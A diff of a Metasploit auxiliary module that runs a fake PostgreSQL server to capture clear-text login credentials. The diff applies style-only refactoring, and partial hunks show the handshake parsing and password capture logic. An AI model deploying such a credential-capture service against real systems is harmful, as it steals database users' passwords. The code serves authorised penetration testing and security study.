@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,16 +7,15 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
   def initialize
     super(
       'Name'           => 'Authentication Capture: PostgreSQL',
-      'Description'    => %q{
+      'Description'    => %q(
         This module provides a fake PostgreSQL service that is designed to
-        capture clear-text authentication credentials.},
+        capture clear-text authentication credentials.),
       'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
       'License'        => MSF_LICENSE,
       'Actions'        => [ [ 'Capture' ] ],
@@ -25,8 +25,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ]),
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ])
+      ], self.class
+    )
   end
 
   # This module is based on MySQL capture module by Patrik Karlsson.
@@ -39,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def report_cred(opts)
@@ -70,18 +71,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport
     }
     @state[c]["status"] = :init
   end
 
   def on_client_data(c)
     data = c.get_once
-    return if not data
+    return unless data
     length = data.slice(0, 4).unpack("N")[0]
-    if length == 8 and @state[c]["status"] == :init
+    if (length == 8) && (@state[c]["status"] == :init)
       # SSL request
       c.put 'N'
       @state[c]["status"] = :send_auth_type
@@ -96,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
       data.slice!(0, 9) # skip over "database\x00"
       @state[c][:database] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
       @state[c]["status"] = :pwn
-    elsif @state[c]["status"] == :pwn and data[0] == 'p'
+    elsif (@state[c]["status"] == :pwn) && (data[0] == 'p')
       # Password message
       data.slice!(0, 5).unpack("N")[0] # skip over length
       @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
@@ -126,7 +127,6 @@ class MetasploitModule < Msf::Auxiliary
       c.put sdata
       c.close
     end
-
   end
 
   def on_client_close(c)
